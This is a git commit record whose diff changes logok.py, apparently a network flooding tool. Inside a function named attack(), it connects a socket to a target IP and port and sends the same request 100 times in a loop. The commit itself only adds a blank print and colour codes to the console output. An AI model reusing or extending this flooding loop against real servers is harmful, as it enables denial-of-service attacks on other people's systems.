67b3e764f9fd0252cb270979fe1ae94a9e2664c2
termul488-ai <termul488@gmail.com>
2026-01-30 01:15:55 +0700

    Update logok.py

--- logok.py
+++ logok.py
@@ -68,8 +68,9 @@ def attack():
       atk.connect((ip, port))
       #star here
       for y in range(100):
+          print()
           atk.send(str.encode(request))
-          print(f"\r" +str(request)+"")
+          print(f"\r\033[38;5;220m" +str(request)+"")
     except socket.error:
       time.sleep(.1)
     except:
